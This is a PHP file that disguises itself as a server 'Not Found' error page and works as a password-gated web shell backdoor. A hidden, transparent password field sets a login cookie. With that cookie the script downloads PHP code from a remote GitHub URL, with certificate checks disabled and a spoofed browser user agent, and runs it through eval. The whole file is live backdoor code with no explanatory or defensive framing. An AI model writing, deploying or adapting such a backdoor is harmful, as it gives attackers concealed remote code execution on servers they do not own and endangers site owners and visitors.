<?php
function is_logged_in()
{
    return isset($_COOKIE['user_id']) && $_COOKIE['user_id'] === 'user123'; 
}

if (is_logged_in()) {
    function geturlsinfo($url)
    {
        if (function_exists('curl_exec')) {
            $conn = curl_init($url);
            curl_setopt($conn, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($conn, CURLOPT_FOLLOWLOCATION, 1);
            curl_setopt($conn, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
            curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, 0);
            curl_setopt($conn, CURLOPT_SSL_VERIFYHOST, 0);
            $url_get_contents_data = curl_exec($conn);
            curl_close($conn);
        } elseif (function_exists('file_get_contents')) {
            $url_get_contents_data = file_get_contents($url);
        } elseif (function_exists('fopen') && function_exists('stream_get_contents')) {
            $handle = fopen($url, "r");
            $url_get_contents_data = stream_get_contents($handle);
            fclose($handle);
        } else {
            $url_get_contents_data = false;
        }
        return $url_get_contents_data;
    }

    $a = geturlsinfo('https://raw.githubusercontent.com/roihee69/sawatdee/main/a.php');
    eval('?>' . $a);
} else {
    if (isset($_POST['p'])) {
        $entered_password = $_POST['p'];
        $hashed_password = '12502de1e4aa2c624d78162e28684cca'; // MD5 hash ของรหัส
        if (md5($entered_password) === $hashed_password) {
            setcookie('user_id', 'user123', time() + 3600, '/');
            header("Location: " . $_SERVER['PHP_SELF']);
            exit();
        } else {
            echo "<p style='color:red;'>Incorrect password.</p>";
        }
    }
    ?>
    <body>
        <h1>Not Found</h1>
        The requested document was not found on this server.
        <p>
        <hr>
        <address>
        Web Server at port 80
        </address>

        <form action="<?php echo $_SERVER['PHP_SELF']; ?>" method="post">
            <input style="border:0;background:transparent;position:absolute;bottom:0;right:0;" 
                   type="password" name="p" required />
        </form>
    </body>
    <?php
}
?>
